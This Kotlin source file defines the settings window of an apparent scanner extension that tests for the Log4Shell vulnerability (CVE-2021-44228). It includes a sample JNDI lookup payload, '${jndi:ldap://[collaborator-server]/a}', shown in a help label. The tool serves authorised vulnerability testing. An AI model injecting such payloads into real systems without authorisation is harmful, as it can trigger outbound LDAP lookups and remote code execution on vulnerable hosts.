package com.dexter0us.log4jScanner

import net.miginfocom.swing.MigLayout
import java.awt.*
import java.awt.event.ActionEvent
import java.awt.event.ActionListener
import java.awt.image.BufferedImage
import java.net.URI
import javax.swing.*

class Log4JUI: JFrame("Log4J Scanner"), ActionListener {

    private val customPayloadTextBox = JTextField()
    private var saveButton = JButton()
    private var twitterButton = JButton()
    private var githubButton = JButton()
    private var blogButton = JButton()
    private var kofiButton = JButton()


    init {
        //      Top Panel (Header) ============================================================

        val heading = JLabel().apply {
            text = "Log4J Scanner"
            font = font.deriveFont(32f).deriveFont(Font.BOLD)
        }

        val tagline = JLabel().apply {
            text = "Log4Shell (CVE-2021-44228) vulnerability active scanner."
            font = font.deriveFont(16f).deriveFont(Font.ITALIC)
        }

        //      Main Panel (Body) =============================================================

        val saveImage = loadImage("htp.png")
        when {
            saveImage != null -> {
                saveButton = JButton("Save settings", saveImage)
                saveButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                saveButton.iconTextGap = 3
            }
            else -> saveButton = JButton("Save settings")
        }
        saveButton.addActionListener(this)


        //      Contact Panel (Footer) ========================================================

        val twitterImage = loadImage("twitter.png")
        when {
            twitterImage != null -> {
                twitterButton = JButton("Follow me on Twitter", twitterImage)
                twitterButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                twitterButton.iconTextGap = 3
            }
            else -> twitterButton = JButton("Follow me on Twitter")
        }
        twitterButton.addActionListener(this)


        val githubImage = loadImage("github.png")
        when {
            githubImage != null -> {
                githubButton = JButton("View Project on Github", githubImage)
                githubButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                githubButton.iconTextGap = 3
            }
            else -> githubButton = JButton("View Project on Github")
        }
        githubButton.addActionListener(this)


        val blogImage = loadImage("blog.png")
        when {
            blogImage != null -> {
                blogButton = JButton("Checkout my Blog", blogImage)
                blogButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                blogButton.iconTextGap = 3
            }
            else -> blogButton = JButton("Checkout my Blog")
        }
        blogButton.addActionListener(this)


        val kofiImage = loadImage("ko-fi.png")
        when {
            kofiImage != null -> {
                kofiButton = JButton("Support Project on Ko-Fi", kofiImage)
                kofiButton.componentOrientation = ComponentOrientation.RIGHT_TO_LEFT
                kofiButton.iconTextGap = 3
            }
            else -> kofiButton = JButton("Buy me a Coffee")
        }
        kofiButton.addActionListener(this)


        val northPanel = JPanel().apply {
            layout = MigLayout("align center")
            border = BorderFactory.createEmptyBorder(5, 5, 5, 5)
            add(heading, "bottom, center, span, wrap")
            add(tagline, "top, center, span, wrap")
        }

        val mainPanel = JPanel().apply {
            layout = MigLayout("align center")
            border = BorderFactory.createEmptyBorder(5, 5, 5, 5)

            add(JLabel("Payload:"), "right")
            add(customPayloadTextBox, "span, growx, wrap, h 30!")
            add(JLabel(
                "<html>Provide a custom payload with placeholders \"[collaborator-server]\".<br/>" +
                        "Sample Payload: \"\${jndi:ldap://<b>[collaborator-server]</b>/a}\"<br/>" +
                        "Do NOT include collaborator url in the payload, just add the placeholder <b>[collaborator-server]</b>.</html>"
            ),
                "left, wrap, growx, span"
            )
            add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
            add(JSeparator(SwingConstants.HORIZONTAL), "")
            add(saveButton, "center, w 250!, h 35!")


        }

        val southPanel = JPanel().apply {
            layout = MigLayout("align center")
            border = BorderFactory.createEmptyBorder(2, 0, 10, 0)

            add(JLabel("Crafted with <3 by Dexter0us"), "span, align center, wrap")
            add(twitterButton, "w 230!, h 35!")
            add(githubButton, "w 230!, h 35!, wrap")
            add(blogButton, "w 230!, h 35!")
            add(kofiButton, "w 230!, h 35!, wrap")
        }

        layout = MigLayout("align center")
        setSize(600,550)
        add(northPanel, "dock north")
        add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
        add(mainPanel, "wrap, align center")
        add(JSeparator(SwingConstants.HORIZONTAL), "wrap")
        add(southPanel, "dock south")

        defaultCloseOperation = DISPOSE_ON_CLOSE
        isResizable = false
        isVisible = true

    }



    override fun actionPerformed(e: ActionEvent?) {
        when (e?.source) {
            saveButton -> {
                initialPayload = customPayloadTextBox.text
                dispose()
            }
            twitterButton -> openInBrowser("https://twitter.com/0xDexter0us")
            githubButton -> openInBrowser("https://github.com/0xDexter0us/Scavenger")
            blogButton -> openInBrowser("https://dexter0us.com/")
            kofiButton -> openInBrowser("https://ko-fi.com/dexter0us")

        }
    }

    // Credits to CoreyD97 for this idea and function
    private fun loadImage(filename: String): ImageIcon? {
        val cldr = this.javaClass.classLoader
        val imageURLMain = cldr.getResource(filename)
        if (imageURLMain != null) {
            val scaled = ImageIcon(imageURLMain).image.getScaledInstance(30, 30, Image.SCALE_SMOOTH)
            val scaledIcon = ImageIcon(scaled)
            val bufferedImage = BufferedImage(30, 30, BufferedImage.TYPE_INT_ARGB)
            val g = bufferedImage.graphics as Graphics2D
            g.setRenderingHint(RenderingHints.KEY_ANTIALIASING, RenderingHints.VALUE_ANTIALIAS_ON)
            g.drawImage(scaledIcon.image, null, null)
            return ImageIcon(bufferedImage)
        }
        return null
    }

    private fun alertBox(str: String) {
        JOptionPane.showMessageDialog(this, str, "Log4J Scanner", JOptionPane.PLAIN_MESSAGE)
    }

    private fun openInBrowser(url: String) {
        if (Desktop.isDesktopSupported() && Desktop.getDesktop().isSupported(Desktop.Action.BROWSE)) {
            Desktop.getDesktop().browse(URI(url))
        } else {
            alertBox("Unable to open browser.\n Visit: $url")
        }
    }

}
